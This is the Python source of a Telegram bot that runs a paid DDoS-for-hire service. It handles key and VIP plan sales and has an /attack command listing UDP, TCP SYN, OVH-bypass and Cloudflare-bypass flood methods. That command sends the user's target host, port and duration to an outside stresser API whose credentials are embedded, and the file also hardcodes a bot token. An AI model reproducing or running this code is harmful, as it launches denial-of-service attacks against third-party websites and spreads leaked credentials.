import telebot
import datetime
import time
import os
import subprocess
#import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6905588939:AAHMI6lEbkO90Ie993ITFFx3CbJYhR030qg' 
bot = telebot.TeleBot(bot_token)

allowed_group_id = -1001749121660

allowed_users = []
processes = []
ADMIN_ID = 2128612759
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()
cooldown_dict = {}  # Thêm dòng này để khởi tạo cooldown_dict

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now

def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()

@bot.message_handler(func=lambda message: message.chat.id != allowed_group_id)
def handle_non_group_message(message):
    bot.reply_to(message, text='Bots Only Work In Groups : https://t.me/modvipchat')

@bot.message_handler(commands=['add_vip', 'add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'You Do Not Have Authority to Use This Command.')
        return

    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Enter Correct Format : /add_vip [id] [day]')
        return

    user_id = int(message.text.split()[1])
    day = int(message.text.split()[2])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=day)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Added {user_id}. {day} Day Order Possible.')

    text_vip_1 = f"- User: {user_id}\n- Day: {day}\n- Message: tg://openmessage?user_id={user_id}"
    allowed_group_vip = -1001814786248  # Thay bằng ID của nhóm chat được phép
    bot.send_message(allowed_group_vip, text_vip_1, disable_web_page_preview=True)
    
load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Please Wait...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    user_id = message.from_user.id
    string = f'DNP-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api=6544fdf316bc935a412a35dd&url=https://onlytris.space/key.html?key!{key}') #
        response_json = response.json() #https://dilink.net/api.php?token=2ee45985e455987676904131128555d46302e60526455073ed2eb137c84b038e&url=https://onlytris.space/key.html?key!{key}&url_phong=https://link4m.co/api-shorten/v2?api=6544fdf316bc935a412a35dd&url=https://onlytris.space/key.html?key!{key}&direct=YES
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Get Key Error Please Use Command Again /getkey."
    except requests.exceptions.RequestException as e:
        url_key = "Get Key Error Please Use Command Again /getkey."
    
    text = f'''
- Link To Get Key Today Is : {url_key}
    '''
    bot.reply_to(message, text)

    text_2 = f"- User: {username}\n- Your Key Is: {key}\n- Link Key: {url_key}\n- Message: tg://openmessage?user_id={user_id}"
    allowed_group_vip = -1001814786248  # Thay bằng ID của nhóm chat được phép
    bot.send_message(allowed_group_vip, text_2, disable_web_page_preview=True)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Please Enter Key...\nExample : /key ngocphong\nUse /getkey Command To Get Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'DNP-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        text_1 = f"- Message: tg://openmessage?user_id={user_id}\n- Enter Key Successfully ( {key} ) ."
        allowed_group_vip = -1001814786248  # Thay bằng ID của nhóm chat được phép
        bot.send_message(allowed_group_vip, text_1, disable_web_page_preview=True)
        bot.reply_to(message, 'Enter Key Successfully.')
    else:
        text_3 = f"- Message: tg://openmessage?user_id={user_id}\n- Wrong or Expired Key ( {key} ) !"
        allowed_group_vip = -1001814786248  # Thay bằng ID của nhóm chat được phép
        bot.send_message(allowed_group_vip, text_3, disable_web_page_preview=True)
        bot.reply_to(message, 'Wrong Or Expired Key !')
        
@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
- /attack : DDoS Website
- /methods : List Methods
- /rules : Rules DDoS
- /plans : Show Plans
- /admin : List Admin
- /getkey : Get Key
- /key : Check Key
'''
    bot.reply_to(message, help_text)
 
@bot.message_handler(commands=['methods', 'method'])
def methods(message):
    help_text = '''
Layer4 Attack Vectors:
* .udp: UDP flood optimized for high GBPS & PPS.
* .gudp: UDP flood optimized for high GBPS.
* .tcp: TCP SYN flood optimized for high packet-per-second. 
* .handshake: TCP Socket flood optimized for high Socket/s.
* .ovh: TCP flood optimized to bypasses OVH Hosting Protection.

Layer7 Attack Vectors:
* .https: HTTP/2 flood using TLSv1.3 with GET + POST.
* .browser: BROWSER flood optimized to bypass Captcha + Uam & Managed.
* .tlsv2: Cloudflare Bypass (Hold = Ban).

/attack [METHODS] [HOST] [PORT] [TIME]
'''
    bot.reply_to(message, help_text)
    
@bot.message_handler(commands=['rule', 'rules'])
def help(message):
    help_text = '''
Rules : 

1. Do Not Share Key Information
2. Do Not Spam Ddos L4 L7
3. Do Not Ddos Dstat Public
4. Do No Ddos Edu/Govs
5. Do Not Ddos Web With L4 And Vice Versa
'''
    bot.reply_to(message, help_text)
    
@bot.message_handler(commands=['admin', 'owner'])
def help(message):
    help_text = '''
Owner : https://t.me/ngocphong0311
'''
    bot.reply_to(message, help_text)
    
@bot.message_handler(commands=['plan', 'plans'])
def help(message):
    username = message.from_user.username

    user_id = message.from_user.id
    help_text = f'''
—————
⚠️ You Can Upgrade Your Plan At Any Time ! ⚠️
—————
Plans : 

• User : {username}
• ID : {user_id}
• Time DDoS : 60 Sec
• Cooldown : 90 Sec

• Sell Plans Bot : 50K/15DAY
• Buy Dms /admin !!!
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, attack_time, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 60:
                cmd_process.terminate()
                bot.reply_to(message, "Attack Order Stopped. Thank You For Using.")
                return
        # Check if the attack time has been reached
        if time.time() - start_time >= attack_time:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack', 'ddos'])
def attack_command(message):
    if not is_bot_active:
        bot.reply_to(message, 'Bot Currently Under Maintenance.')
        return
    
    user_id = message.from_user.id
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please Enter Key.\nUse Command /getkey Key To Get Key\nUse Command /key Key To Check Key')
        return

    if len(message.text.split()) < 5:
        bot.reply_to(message, 'Please Enter Correct Syntax.\nFor Example : /attack + [methods] + [host] + [port] + [time]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 90:
        remaining_time = int(90 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please Wait {remaining_time} Seconds Before Using the /attack Command Again.")
        return

    args = message.text.split()
    method = args[1].upper()
    host = args[2]
    port = args[3]
    attack_time = args[4]

    attack_methods =["UDP", "GUDP", "TCP", "HANDSHAKE", "OVH", "HTTPS", "BROWSER", "TLSV2"]
    if method not in attack_methods:
        bot.reply_to(message, 'Invalid Attack Method. Use /methods Command To See Attack Methods')
        return

    blocked_domains = [".edu", ".gov", ".gob", ".mil", "dstat", "stress", "nosec", "seized.ws/nosec", "seized.ws", "azota", "google", "yandex", "qiwi", "vk", "tiktok", "instagram", "twitter", "youtube", "rutube", "github", "sheepyy", "dzen", "bxv", "whatsapp", "cloudflare", "baloo", "amazon", "telegram", "fbi", "request", "request", "space", "file.cunhua.today", "packet-time.xyz", "l7safe.request.social", "l7.request.social", "uam.request.social", "no.request123.xyz", "104.238.212.25", "138.197.109.106", "chinhphu.vn", "ngocphong.com", "virustotal.com", "cloudflare.com", "check-host.cc", "check-host.net", "open.spotify.com", "www.snapchat.com", "usa.gov", "fbi.gov", "nasa.gov", "google.com", "translate.google.com", "github.com", "www.youtube.com", "www.facebook.com", "chat.openai.com", "shopee.vn", "mail.google.com", "tiktok.com", "instagram.com", "twitter.com", "telegram.org"]
    if any(domain in host for domain in blocked_domains):
        bot.reply_to(message, "Target Is In The Block List.")
        return

    if int(attack_time) > 61:
        bot.reply_to(message, 'Attack Time Cannot Exceed 60 Seconds.')
        return

    username = message.from_user.username

    bot.reply_to(message, f'Target : {host}\nPort : {port}\nTime : {attack_time}\nMethod : {method}\n\n(@{username} Connecting To Api)')

    args = message.text.split()
    method = args[1].upper()
    host = args[2]
    port = args[3]
    attack_time = args[4]

    cooldown_dict[username] = {'attack': current_time}

    # Gửi dữ liệu tới api
    api_1 = f"https://apisystem.herios-stress.xyz/api/attack?username=ngocphong&key=duongngocphong0311&host={host}&port={port}&time={attack_time}&method=.{method}&concurrents=1"
    response = requests.get(api_1) #
#    print("\n", response.text, "\n")

    bot.reply_to(message, response.text)
#    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┣➤ Attack Sent ...\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By : @{username}\n┣➤ Target : {host}\n┣➤ Port : {port}\n┣➤ Time : {attack_time}\n┣➤ Method : {method}\n┃\n┣➤ Website : https://ngocphong.space\n┣➤ Group : https://t.me/modvipchat\n┣➤ Admin : https://t.me/ngocphong0311\n┗━━━━━━━━━━━━━━➤')
    text_vip_2 = f"- Methods: {method}\n- Target: {host}\n- Port: {port}\n- Time: {attack_time}\n- Message: tg://openmessage?user_id={user_id}"
    allowed_group_vip = -1001814786248  # Thay bằng ID của nhóm chat được phép
    bot.send_message(allowed_group_vip, text_vip_2, disable_web_page_preview=True)

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You Do Not Have Authority to Use This Command.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot Offline.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You Do Not Have Authority to Use This Command.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot Online.')

# Hàm tính thời gian hoạt động của bot
start_time = time.time()

@bot.message_handler(commands=['time'])
def show_uptime(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You Do Not Have Authority to Use This Command.')
        return
        
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} Hours {minutes} Minutes {seconds} Seconds'
    bot.reply_to(message, f'Bot Now Working : {uptime_str}')

bot.infinity_polling(timeout=60, long_polling_timeout=1)